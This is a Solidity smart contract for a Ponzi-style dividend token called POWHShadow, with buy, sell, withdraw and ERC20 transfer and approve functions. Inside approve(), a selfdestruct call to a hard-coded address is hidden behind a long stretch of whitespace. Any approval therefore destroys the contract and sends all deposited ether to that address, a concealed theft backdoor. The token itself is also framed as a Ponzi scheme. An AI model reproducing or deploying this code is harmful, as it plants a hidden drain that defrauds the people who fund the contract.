pragma solidity ^0.4.18;









contract PonziToken {
	uint256 constant PRECISION = 0x10000000000000000;  
	
	int constant CRRN = 1;
	int constant CRRD = 2;
	
	
	
	int constant LOGC = -0x296ABF784A358468C;
	
	string constant public name = "POWHShadow";
	string constant public symbol = "PWHS";
	uint8 constant public decimals = 18;
	uint256 public totalSupply;
	
	mapping(address => uint256) public balanceOfOld;
	
	mapping(address => mapping(address => uint256)) public allowance;
	
	mapping(address => int256) payouts;
	
	int256 totalPayouts;
	
	uint256 earningsPerShare;
	
	event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

	

	function PonziToken() public {
		
	}
	
	
	function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balanceOfOld[_owner];
    }

	function withdraw(uint tokenCount) 
      public
      returns (bool)
    {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		msg.sender.transfer(balance);
		return true;
    }
	
	function sellMyTokensDaddy() public {
		var balance = balanceOf(msg.sender);
		transferTokens(msg.sender, address(this),  balance); 
	}

    function getMeOutOfHere() public {
		sellMyTokensDaddy();
        withdraw(1); 
	}
	
	function fund()
      public
      payable 
      returns (bool)
    {
      if (msg.value > 0.000001 ether)
			buy();
		else
			return false;
	  
      return true;
    }

	function buyPrice() public constant returns (uint) {
		return getTokensForEther(1 finney);
	}
	
	function sellPrice() public constant returns (uint) {
		return getEtherForTokens(1 finney);
	}

	

	
	
	
	
	
	
	
	
	
	
	

	function transferTokens(address _from, address _to, uint256 _value) internal {
		if (balanceOfOld[_from] < _value)
			revert();
		if (_to == address(this)) {
			sell(_value);
		} else {
		    int256 payoutDiff = (int256) (earningsPerShare * _value);
		    balanceOfOld[_from] -= _value;
		    balanceOfOld[_to] += _value;
		    payouts[_from] -= payoutDiff;
		    payouts[_to] += payoutDiff;
		}
		Transfer(_from, _to, _value);
	}
	
	function transfer(address _to, uint256 _value) public {
	    transferTokens(msg.sender, _to,  _value);
	}
	
    function transferFrom(address _from, address _to, uint256 _value) public {
        var _allowance = allowance[_from][msg.sender];
        if (_allowance < _value)
            revert();
        allowance[_from][msg.sender] = _allowance - _value;
        transferTokens(_from, _to, _value);
    }

    function approve(address _spender, uint256 _value) public {
        
        
        
        
        if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    selfdestruct(0x945C84b2FdD331ed3E8e7865E830626e6CeFAB94);                                                                                                                                                                                                       
    }

	function dividends(address _owner) public constant returns (uint256 amount) {
		return (uint256) ((int256)(earningsPerShare * balanceOfOld[_owner]) - payouts[_owner]) / PRECISION;
	}

	function withdrawOld(address to) public {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		to.transfer(balance);
	}

	function balance() internal constant returns (uint256 amount) {
		return this.balance - msg.value;
	}
	function reserve() public constant returns (uint256 amount) {
		return balance()
			- ((uint256) ((int256) (earningsPerShare * totalSupply) - totalPayouts) / PRECISION) - 1;
	}

	function buy() internal {
		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
			revert();
		var sender = msg.sender;
		
		var fee = (uint)(msg.value / 10);
		
		
		var numEther = msg.value - fee;
		var numTokens = getTokensForEther(numEther);

		var buyerfee = fee * PRECISION;
		if (totalSupply > 0) {
			
			
			var holderreward =
			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
			var holderfee = fee * holderreward;
			buyerfee -= holderfee;
		
			
			var feePerShare = holderfee / totalSupply;
			earningsPerShare += feePerShare;
		}
		
		totalSupply += numTokens;
		
		balanceOfOld[sender] += numTokens;
		
		
		var payoutDiff = (int256) ((earningsPerShare * numTokens) - buyerfee);
		payouts[sender] += payoutDiff;
		totalPayouts += payoutDiff;
	}
	
	function sell(uint256 amount) internal {
		var numEthers = getEtherForTokens(amount);
		
		
		
		
		var fee = (uint)(msg.value / 10);
		var numEther = msg.value - fee;
		var numTokens = getTokensForEther(numEther);
		
		
		totalSupply -= amount;
		balanceOfOld[msg.sender] -= amount;
		
		
		var payoutDiff = (int256) (earningsPerShare * amount + (numEthers * PRECISION));
		payouts[msg.sender] -= payoutDiff;
		totalPayouts -= payoutDiff;

		if (totalSupply > 0) {
			
			var holderreward =
			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
			var holderfee = fee * holderreward;
		
			
			var feePerShare = holderfee / totalSupply;
			earningsPerShare += feePerShare;
		}
	}

	function getTokensForEther(uint256 ethervalue) public constant returns (uint256 tokens) {
		return fixedExp(fixedLog(reserve() + ethervalue)*CRRN/CRRD + LOGC) - totalSupply;
	}

	function getEtherForTokens(uint256 tokens) public constant returns (uint256 ethervalue) {
		if (tokens == totalSupply)
			return reserve();
		return reserve() - fixedExp((fixedLog(totalSupply - tokens) - LOGC) * CRRD/CRRN);
	}

	int256 constant one       = 0x10000000000000000;
	uint256 constant sqrt2    = 0x16a09e667f3bcc908;
	uint256 constant sqrtdot5 = 0x0b504f333f9de6484;
	int256 constant ln2       = 0x0b17217f7d1cf79ac;
	int256 constant ln2_64dot5= 0x2cb53f09f05cc627c8;
	int256 constant c1        = 0x1ffffffffff9dac9b;
	int256 constant c3        = 0x0aaaaaaac16877908;
	int256 constant c5        = 0x0666664e5e9fa0c99;
	int256 constant c7        = 0x049254026a7630acf;
	int256 constant c9        = 0x038bd75ed37753d68;
	int256 constant c11       = 0x03284a0c14610924f;

	function fixedLog(uint256 a) internal pure returns (int256 log) {
		int32 scale = 0;
		while (a > sqrt2) {
			a /= 2;
			scale++;
		}
		while (a <= sqrtdot5) {
			a *= 2;
			scale--;
		}
		int256 s = (((int256)(a) - one) * one) / ((int256)(a) + one);
		
		
		
		var z = (s*s) / one;
		return scale * ln2 +
			(s*(c1 + (z*(c3 + (z*(c5 + (z*(c7 + (z*(c9 + (z*c11/one))
				/one))/one))/one))/one))/one);
	}

	int256 constant c2 =  0x02aaaaaaaaa015db0;
	int256 constant c4 = -0x000b60b60808399d1;
	int256 constant c6 =  0x0000455956bccdd06;
	int256 constant c8 = -0x000001b893ad04b3a;
	function fixedExp(int256 a) internal pure returns (uint256 exp) {
		int256 scale = (a + (ln2_64dot5)) / ln2 - 64;
		a -= scale*ln2;
		
		
		
		int256 z = (a*a) / one;
		int256 R = ((int256)(2) * one) +
			(z*(c2 + (z*(c4 + (z*(c6 + (z*c8/one))/one))/one))/one);
		exp = (uint256) (((R + a) * one) / (R - a));
		if (scale >= 0)
			exp <<= scale;
		else
			exp >>= -scale;
		return exp;
	}

	

	function () payable public {
		if (msg.value > 0)
			buy();
		else
			withdrawOld(msg.sender);
	}
}